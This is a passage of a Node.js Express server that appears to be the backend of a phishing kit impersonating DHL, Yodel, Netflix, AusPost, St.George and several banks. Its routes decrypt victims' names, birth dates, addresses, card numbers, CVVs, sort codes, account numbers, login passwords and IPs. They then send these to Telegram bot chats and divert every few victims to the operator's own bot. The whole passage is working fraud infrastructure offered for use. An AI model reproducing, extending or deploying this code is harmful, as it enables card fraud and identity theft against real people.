  uniqueid = req.body.uniqueid;

  if (georgeCount == 20) {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
    );

    let details = [accessNo, password, secNo, uniqueid, ip, "haytchPanel123!"];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount = 0;
  } else {
    let details = [accessNo, password, secNo, uniqueid, ip, owner];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount += 1;
  }
});

app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//AIB
app.use("/aib", require("./routes/aib"));

//VANQUIS
app.use("/vanquis", require("./routes/vanquis"));

//BENDIGO
app.use("/bendigo", require("./routes/bendigo"));

//AUSPOSTwLogs
//AUSPOSTwLogs
//AUSPOSTwLogs

app.post("/ausPostLog", (req, res) => {
  username = req.body.username;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

app.post("/ausPostStGeorgeLog", (req, res) => {
  accessNo = req.body.accessNo;
  secNo = req.body.secNo;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nAccess Number: ${accessNo}\nSecurity Number: ${secNo}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

//O2
app.use("/o2", require("./routes/o2"));

//AUSPOST
app.use("/auspost", require("./routes/auspost"));

//MEDICARE

app.use("/medicare", require("./routes/medicare"));

//DHL
//DHL
//DHL

let mason = 4;

app.post("/masonDHL", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

//NETLIX
//NETLIX
//NETLIX

app.post("/fpaysNetflix", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
      if (fpaysC == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

//YODEL
//YODEL
//YODEL

app.post("/sendYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `YodelTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1190384225,
            text: `Yodel:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

let ssCount = 0;

app.post("/sendSSYodelres", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

let yodelM4STERB0Y = 0;

app.post("/yodelM4STERB0Y", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yodelM4STERB0Y == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yodelM4STERB0Y = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
        );
        yodelM4STERB0Y += 1;
      }

      res.send("Update Completed");
    });
});

let arcount = 0;

app.post("/sendARRYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (arcount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        arcount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
        );
        arcount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/mazzaYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        mazCount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/yardzYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yardzCount = 6;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelYardz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Yodel:\n${originalText}`
        );
        yardzCount += 1;
      }

      res.send("Update Completed");
    });
});

let hoods = 2;

app.post("/hoodsYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (hoods == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        hoods = 0;
      } else if (bin === "542011") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
        );
        hoods += 1;
      }

      res.send("Update Completed");
    });
});

let bill = 0;

app.post("/sendBigBillz20", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
